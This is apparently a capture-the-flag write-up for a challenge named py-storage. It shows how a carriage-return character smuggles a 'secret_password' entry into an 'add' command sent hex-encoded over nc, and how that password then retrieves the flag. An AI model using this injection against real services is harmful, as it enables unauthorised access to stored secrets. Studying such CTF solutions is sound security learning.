1. Connect to the server

```shell
> nc py-storage.2024.ctfcompetition.com 1337
== proof-of-work: disabled ==
```

2. In Python interpreter, get the hex string of the adding command with "\r" line separator and send it to the server

```python
>>> bytes.hex('add abc 123\rsecret_password:pass1234'.encode())
'61646420616263203132330d7365637265745f70617373776f72643a7061737331323334'
```

```shell
61646420616263203132330d7365637265745f70617373776f72643a7061737331323334
6f6b3a20616464
```

```python
>>> bytes.fromhex('6f6b3a20616464')
b'ok: add'
```

3. Get the flag by using the inserted password

```python
>>> bytes.hex('auth pass1234 get secret_flag'.encode())
'6175746820706173733132333420676574207365637265745f666c6167'
```

```shell
6175746820706173733132333420676574207365637265745f666c6167
6f6b3a206765743a205b274354467b554e497633727361315f6e65574c696e655f31734e545f53404665213f7d275d
```

```python
>>> bytes.fromhex('6f6b3a206765743a205b274354467b554e497633727361315f6e65574c696e655f31734e545f53404665213f7d275d')
b"ok: get: ['CTF{UNIv3rsa1_neWLine_1sNT_S@Fe!?}']"
```
